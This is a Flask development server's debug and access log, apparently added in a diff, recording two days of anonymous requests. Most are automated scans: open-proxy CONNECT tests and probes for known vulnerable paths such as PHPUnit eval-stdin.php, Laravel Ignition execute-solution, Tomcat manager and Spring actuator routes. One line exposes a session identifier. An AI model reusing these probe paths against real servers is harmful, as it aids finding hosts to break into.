+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '35f04d73dcc2a8a4e009331d7e167425cabd9cf46cbb9c6d605e957a1d17daaf7419058c6b57478146b2190a4cdf5fd5c3331c9aa13570351f5c689606ecd8e1', '_user_id': '2', 'last_active': '2024-09-19T17:00:28.931123+08:00', 'user_id': 2}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98456890>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98438690>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98446150>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98444690>
+Before request - Is authenticated: False
+27.115.124.70 - - [19/Sep/2024 17:04:00] "GET /login?next=/ HTTP/1.1" 200 -
+27.115.124.38 - - [19/Sep/2024 17:04:00] "GET /static/css/auth.css HTTP/1.1" 200 -
+44.220.185.215 - - [19/Sep/2024 17:06:25] "[32mGET / HTTP/1.1[0m" 302 -
+44.220.185.215 - - [19/Sep/2024 17:06:26] "GET /login?next=/ HTTP/1.1" 200 -
+154.213.184.25 - - [19/Sep/2024 17:10:38] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+64.227.18.137 - - [19/Sep/2024 17:16:04] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+64.62.197.172 - - [19/Sep/2024 17:46:25] code 400, message Bad request version ('À\x14À')
+64.62.197.172 - - [19/Sep/2024 17:46:25] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03I\x86æ\x02¯©ê\x8b\x07zÙ5²#\x1c]\x17\x82Â\x05\x90'Á?À}§?!\x8cºø\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+45.84.89.2 - - [19/Sep/2024 17:51:17] "[32mGET / HTTP/1.0[0m" 302 -
+139.226.161.177 - - [19/Sep/2024 18:02:20] "[32mHEAD http://110.242.68.4/ HTTP/1.1[0m" 302 -
+139.226.161.177 - - [19/Sep/2024 18:02:20] "HEAD http://110.242.68.4/login?next=/ HTTP/1.1" 200 -
+124.31.104.49 - - [19/Sep/2024 18:02:21] "[33mCONNECT www.voanews.com:443 HTTP/1.1[0m" 404 -
+124.31.104.49 - - [19/Sep/2024 18:02:21] "[32mGET http://www.minghui.org/ HTTP/1.1[0m" 302 -
+59.173.134.210 - - [19/Sep/2024 18:02:21] "GET http://www.minghui.org/login?next=/ HTTP/1.1" 200 -
+59.173.134.210 - - [19/Sep/2024 18:02:23] "[32mGET http://dongtaiwang.com/ HTTP/1.1[0m" 302 -
+59.173.134.210 - - [19/Sep/2024 18:02:23] "GET http://dongtaiwang.com/login?next=/ HTTP/1.1" 200 -
+59.173.134.210 - - [19/Sep/2024 18:02:23] "[33mCONNECT cn.bing.com:443 HTTP/1.1[0m" 404 -
+59.173.134.210 - - [19/Sep/2024 18:02:23] "[32mGET http://www.wujieliulan.com/ HTTP/1.1[0m" 302 -
+59.173.134.210 - - [19/Sep/2024 18:02:23] "GET http://www.wujieliulan.com/login?next=/ HTTP/1.1" 200 -
+59.173.134.210 - - [19/Sep/2024 18:02:24] "[33mGET http://www.rfa.org/english/ HTTP/1.1[0m" 404 -
+61.158.26.153 - - [19/Sep/2024 18:02:25] "[33mCONNECT www.baidu.com:443 HTTP/1.1[0m" 404 -
+61.158.26.153 - - [19/Sep/2024 18:02:25] "[32mGET http://www.soso.com/ HTTP/1.1[0m" 302 -
+61.158.26.153 - - [19/Sep/2024 18:02:25] "[33mCONNECT www.so.com:443 HTTP/1.1[0m" 404 -
+61.158.26.153 - - [19/Sep/2024 18:02:26] "GET http://www.soso.com/login?next=/ HTTP/1.1" 200 -
+61.158.26.153 - - [19/Sep/2024 18:02:26] "[32mGET http://www.epochtimes.com/ HTTP/1.1[0m" 302 -
+61.158.26.153 - - [19/Sep/2024 18:02:28] "GET http://www.epochtimes.com/login?next=/ HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 18:21:58] "GET /login?next=/ HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 18:21:58] "[36mGET /static/css/auth.css HTTP/1.1[0m" 304 -
+154.213.187.52 - - [19/Sep/2024 18:31:09] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+60.191.125.35 - - [19/Sep/2024 18:52:46] "[32mHEAD http://112.124.42.80:63435/ HTTP/1.1[0m" 302 -
+60.191.125.35 - - [19/Sep/2024 18:52:46] "GET http://112.124.42.80:63435/login?next=/ HTTP/1.1" 200 -
+206.168.34.58 - - [19/Sep/2024 18:54:26] "[32mGET / HTTP/1.1[0m" 302 -
+206.168.34.58 - - [19/Sep/2024 18:54:31] "[32mGET / HTTP/1.1[0m" 302 -
+206.168.34.58 - - [19/Sep/2024 18:54:33] code 505, message Invalid HTTP version (2.0)
+206.168.34.58 - - [19/Sep/2024 18:54:33] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+206.168.34.58 - - [19/Sep/2024 18:54:36] "GET /login HTTP/1.1" 200 -
+206.168.34.58 - - [19/Sep/2024 18:54:37] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+206.168.34.58 - - [19/Sep/2024 18:54:38] code 505, message Invalid HTTP version (2.0)
+206.168.34.58 - - [19/Sep/2024 18:54:38] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+206.168.34.58 - - [19/Sep/2024 18:54:38] "[32mGET / HTTP/1.1[0m" 302 -
+172.169.205.16 - - [19/Sep/2024 19:07:53] "[32mGET / HTTP/1.1[0m" 302 -
+154.213.184.25 - - [19/Sep/2024 19:37:44] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+134.122.28.179 - - [19/Sep/2024 19:49:30] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+154.213.184.18 - - [19/Sep/2024 20:02:27] "[33mCONNECT example.com:443 HTTP/1.1[0m" 404 -
+154.213.184.25 - - [19/Sep/2024 20:27:31] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+104.209.35.238 - - [19/Sep/2024 20:55:04] "[33mGET /manager/text/list HTTP/1.1[0m" 404 -
+162.142.125.218 - - [19/Sep/2024 21:47:28] "[32mGET / HTTP/1.1[0m" 302 -
+162.142.125.218 - - [19/Sep/2024 21:47:32] "[32mGET / HTTP/1.1[0m" 302 -
+162.142.125.218 - - [19/Sep/2024 21:47:32] code 505, message Invalid HTTP version (2.0)
+162.142.125.218 - - [19/Sep/2024 21:47:32] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+Before request - Session: <SecureCookieSession {'_flashes': [('message', 'Please log in to access this page.')], '_fresh': False}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848f0d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848df90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848f910>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_flashes': [('message', 'Please log in to access this page.')], '_fresh': False}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98490090>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98de3850>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984391d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98455950>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98446b10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984799d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98446e90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846c890>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98479f90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848b4d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846eed0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848fa90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848d110>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98491190>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984922d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98491e50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984aac10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98491310>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848d5d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848f790>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848bd90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846e550>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9847afd0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846c950>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848fa10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_flashes': [('message', 'Please log in to access this page.')], '_fresh': False}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9847ab50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e983e5350>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98444e90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98446d90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a82d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984aa250>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a8d50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9847bdd0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846fa10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846c610>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98446010>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848d650>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9847a690>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848dc90>
+Before request - Is authenticated: False
+162.142.125.218 - - [19/Sep/2024 21:47:37] "GET /login HTTP/1.1" 200 -
+162.142.125.218 - - [19/Sep/2024 21:47:38] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+162.142.125.218 - - [19/Sep/2024 21:47:38] code 505, message Invalid HTTP version (2.0)
+162.142.125.218 - - [19/Sep/2024 21:47:38] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+162.142.125.218 - - [19/Sep/2024 21:47:39] "[32mGET / HTTP/1.1[0m" 302 -
+199.45.155.66 - - [19/Sep/2024 23:25:16] code 400, message Bad request version ('À\x14À')
+199.45.155.66 - - [19/Sep/2024 23:25:16] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03°j\x9cbÐ°Õí\x0e*\x08\x9eÿu×ã,ò\x98\x81\x0b\x03?\x8a\x84aISÍ\x82oµ Ð\x16³¤*Ïp«<õ£Ý+Ð;É£ò»ÄH\x91î3»VîIM\x12~%\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+154.213.184.18 - - [19/Sep/2024 23:36:32] "[33mCONNECT example.com:443 HTTP/1.1[0m" 404 -
+68.183.29.36 - - [19/Sep/2024 23:41:12] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+154.213.184.25 - - [19/Sep/2024 23:47:22] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+91.92.251.254 - - [20/Sep/2024 00:03:07] "[33mCONNECT 45.61.137.126:7227 HTTP/1.1[0m" 404 -
+45.148.10.242 - - [20/Sep/2024 00:43:52] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+218.64.60.224 - - [20/Sep/2024 01:27:22] "[32mHEAD http://110.242.68.4/ HTTP/1.1[0m" 302 -
+218.64.60.224 - - [20/Sep/2024 01:27:22] "HEAD http://110.242.68.4/login?next=/ HTTP/1.1" 200 -
+183.160.195.68 - - [20/Sep/2024 01:27:23] "[32mGET http://www.soso.com/ HTTP/1.1[0m" 302 -
+183.160.195.68 - - [20/Sep/2024 01:27:23] "GET http://www.soso.com/login?next=/ HTTP/1.1" 200 -
+122.96.28.28 - - [20/Sep/2024 01:27:24] "[32mGET http://www.wujieliulan.com/ HTTP/1.1[0m" 302 -
+122.96.28.28 - - [20/Sep/2024 01:27:24] "GET http://www.wujieliulan.com/login?next=/ HTTP/1.1" 200 -
+122.96.28.28 - - [20/Sep/2024 01:27:26] "[33mCONNECT www.so.com:443 HTTP/1.1[0m" 404 -
+180.95.231.150 - - [20/Sep/2024 01:27:27] "[33mGET http://www.rfa.org/english/ HTTP/1.1[0m" 404 -
+180.95.231.150 - - [20/Sep/2024 01:27:28] "[33mCONNECT www.voanews.com:443 HTTP/1.1[0m" 404 -
+180.95.231.150 - - [20/Sep/2024 01:27:29] "[32mGET http://www.epochtimes.com/ HTTP/1.1[0m" 302 -
+180.95.231.150 - - [20/Sep/2024 01:27:29] "GET http://www.epochtimes.com/login?next=/ HTTP/1.1" 200 -
+180.95.231.150 - - [20/Sep/2024 01:27:30] "[32mGET http://dongtaiwang.com/ HTTP/1.1[0m" 302 -
+180.95.231.150 - - [20/Sep/2024 01:27:30] "[32mGET http://www.minghui.org/ HTTP/1.1[0m" 302 -
+123.245.84.193 - - [20/Sep/2024 01:27:30] "GET http://dongtaiwang.com/login?next=/ HTTP/1.1" 200 -
+123.245.84.193 - - [20/Sep/2024 01:27:30] "GET http://www.minghui.org/login?next=/ HTTP/1.1" 200 -
+123.245.84.193 - - [20/Sep/2024 01:27:30] "[33mCONNECT cn.bing.com:443 HTTP/1.1[0m" 404 -
+123.245.84.193 - - [20/Sep/2024 01:27:32] "[33mCONNECT www.baidu.com:443 HTTP/1.1[0m" 404 -
+198.244.231.125 - - [20/Sep/2024 01:31:57] "[33mCONNECT www.ipdeny.com:443 HTTP/1.1[0m" 404 -
+154.213.187.5 - - [20/Sep/2024 01:52:26] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+154.213.187.241 - - [20/Sep/2024 02:08:29] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+154.213.184.25 - - [20/Sep/2024 02:09:02] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+12.208.125.142 - - [20/Sep/2024 02:32:42] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+124.23.133.179 - - [20/Sep/2024 02:34:04] "[32mGET / HTTP/1.1[0m" 302 -
+134.122.19.98 - - [20/Sep/2024 02:54:08] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+95.214.27.169 - - [20/Sep/2024 02:59:47] "[32mGET http://example.com/ HTTP/1.1[0m" 302 -
+95.214.27.169 - - [20/Sep/2024 02:59:47] "GET http://example.com/login?next=/ HTTP/1.1" 200 -
+95.214.27.169 - - [20/Sep/2024 02:59:48] "[33mCONNECT example.com:443 HTTP/1.1[0m" 404 -
+95.214.27.169 - - [20/Sep/2024 02:59:48] "[32mGET http://example.com/ HTTP/1.1[0m" 302 -
+95.214.27.169 - - [20/Sep/2024 02:59:49] "GET http://example.com/login?next=/ HTTP/1.1" 200 -
+95.214.27.169 - - [20/Sep/2024 02:59:49] "[33mCONNECT example.com:443 HTTP/1.1[0m" 404 -
+87.120.166.244 - - [20/Sep/2024 03:05:35] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+111.7.96.149 - - [20/Sep/2024 03:06:32] "[32mGET / HTTP/1.1[0m" 302 -
+123.160.223.72 - - [20/Sep/2024 03:06:40] "[32mGET / HTTP/1.1[0m" 302 -
+123.160.223.75 - - [20/Sep/2024 03:06:40] "GET /login?next=/ HTTP/1.1" 200 -
+123.160.223.74 - - [20/Sep/2024 03:06:40] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+36.41.68.215 - - [20/Sep/2024 03:09:23] "[32mGET / HTTP/1.1[0m" 302 -
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984900d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98491ad0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a82d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984aa910>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98493150>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9847acd0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98489490>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98447590>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98447890>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e983e55d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848c450>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846f810>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a8150>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984ab0d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a8b50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b4390>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b6310>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a9ed0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848d850>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a9a90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a8d50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a81d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9846d250>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848a710>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98447890>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984478d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b7d10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b7690>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b6a50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848af10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98445250>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848edd0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98488bd0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98438310>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a8290>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984aa090>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984a9a10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b61d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b5590>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b7850>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b5e10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984bc490>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984b5010>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {}>
+36.41.68.215 - - [20/Sep/2024 03:09:23] "GET /login?next=/ HTTP/1.1" 200 -
+36.41.68.215 - - [20/Sep/2024 03:09:23] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+78.108.177.51 - - [20/Sep/2024 03:27:07] "[32mGET / HTTP/1.0[0m" 302 -
+154.213.184.25 - - [20/Sep/2024 03:44:24] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+154.213.184.18 - - [20/Sep/2024 03:45:13] "[33mCONNECT example.com:443 HTTP/1.1[0m" 404 -
+83.97.73.245 - - [20/Sep/2024 03:52:53] "[33mGET /securityRealm/user/admin/search/index?q=a HTTP/1.1[0m" 404 -
+83.97.73.245 - - [20/Sep/2024 03:57:53] "[32mGET / HTTP/1.1[0m" 302 -
+83.97.73.245 - - [20/Sep/2024 03:57:53] "GET /login?next=/ HTTP/1.1" 200 -
+83.97.73.245 - - [20/Sep/2024 04:00:13] "[33mPOST /Autodiscover/Autodiscover.xml HTTP/1.1[0m" 404 -
+83.97.73.245 - - [20/Sep/2024 04:02:43] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+83.97.73.245 - - [20/Sep/2024 04:06:50] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+83.97.73.245 - - [20/Sep/2024 04:12:46] "[32mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1[0m" 302 -
+83.97.73.245 - - [20/Sep/2024 04:12:47] "GET /login?next=/?XDEBUG_SESSION_START%3Dphpstorm HTTP/1.1" 200 -
+83.97.73.245 - - [20/Sep/2024 04:17:51] "[33mGET /console/ HTTP/1.1[0m" 404 -
+83.97.73.245 - - [20/Sep/2024 04:23:08] "[33mGET /_ignition/execute-solution HTTP/1.1[0m" 404 -
+83.97.73.245 - - [20/Sep/2024 04:25:44] "[32mGET / HTTP/1.1[0m" 302 -
+83.97.73.245 - - [20/Sep/2024 04:25:45] "GET /login?next=/ HTTP/1.1" 200 -
+91.92.245.45 - - [20/Sep/2024 04:28:58] "[33mCONNECT google.com:443 HTTP/1.1[0m" 404 -
+83.97.73.245 - - [20/Sep/2024 04:31:06] "[32mGET / HTTP/1.1[0m" 302 -
+83.97.73.245 - - [20/Sep/2024 04:31:06] "GET /login?next=/ HTTP/1.1" 200 -
+83.97.73.245 - - [20/Sep/2024 04:37:46] "[33mGET /actuator/gateway/routes HTTP/1.1[0m" 404 -
+206.168.34.38 - - [20/Sep/2024 04:38:57] "[32mGET / HTTP/1.1[0m" 302 -
+206.168.34.38 - - [20/Sep/2024 04:39:01] "[32mGET / HTTP/1.1[0m" 302 -
+206.168.34.38 - - [20/Sep/2024 04:39:02] code 505, message Invalid HTTP version (2.0)
+206.168.34.38 - - [20/Sep/2024 04:39:02] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+206.168.34.38 - - [20/Sep/2024 04:39:07] "GET /login HTTP/1.1" 200 -
+206.168.34.38 - - [20/Sep/2024 04:39:08] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+206.168.34.38 - - [20/Sep/2024 04:39:09] code 505, message Invalid HTTP version (2.0)
+206.168.34.38 - - [20/Sep/2024 04:39:09] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+206.168.34.38 - - [20/Sep/2024 04:39:10] "[32mGET / HTTP/1.1[0m" 302 -
+83.97.73.245 - - [20/Sep/2024 04:40:51] "[33mGET /geoserver HTTP/1.1[0m" 404 -
